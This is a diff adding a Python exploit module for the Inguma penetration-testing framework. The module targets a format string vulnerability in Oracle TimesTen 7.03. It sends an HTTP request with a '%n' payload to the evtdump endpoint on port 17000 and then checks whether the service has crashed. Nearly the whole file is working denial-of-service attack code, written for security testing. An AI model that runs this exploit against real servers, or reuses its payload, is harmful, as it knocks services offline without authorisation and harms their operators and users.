@@ -1,0 +1,76 @@
+#!/usr/bin/python
+
+"""
+Oracle TimesTen 7.XX Remote Format String for Inguma
+Copyright (c) 2007 Joxean Koret <joxeankoret@yahoo.es>
+
+License is GPL
+"""
+
+import sys
+import time
+import socket
+from lib.libexploit import CIngumaModule
+
+name = "oratt70fmt"
+brief_description = "Oracle Times Ten 70 Format String (POC) #5"
+type = "exploit"
+affects = ["Oracle TimesTen 7.03"]
+description = """
+Oracle TimesTen 7.X is vulnerable to a format string vulnerability.
+"""
+patch = "Fixed in Oracle CPU Jan 2009"
+category = "dos"
+discoverer = "Joxean Koret"
+author = "Joxean Koret <joxeankoret@yahoo.es>"
+
+class COraTtFmt(CIngumaModule):
+    target = ""  # Main target
+    port = 17000
+    waitTime = 0
+    timeout = 1
+    exploitType = 1
+    services = {}
+    results = {}
+    dict = None
+    interactive = True
+
+    def run(self):
+    
+        if self.target == "" or self.target is None:
+            self.target = "localhost"
+            print "[+] Warning! No target selected. Setting localhost as selected"
+        
+        if self.port == 0 or self.port is None:
+            self.port = 17000
+    
+        buf = "GET evtdump?msg=AAAA%25n HTTP/1.0\r\n\r\n"
+
+        try:
+            socket.setdefaulttimeout(self.timeout)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((self.target, self.port))
+            s.send(buf)
+            print s.recv(4096)
+            s.close()
+
+            print "POC sended, waiting for a while..."
+            time.sleep(3)
+
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((self.target, self.port))
+                s.close()
+
+                print "POC doesn't work :("
+                return False
+            except:
+                print "POC works!"
+                return False
+        except:
+            print sys.exc_info()[1]
+            print "POC doesn't work :("
+            return False
+
+    def printSummary(self):
+        pass
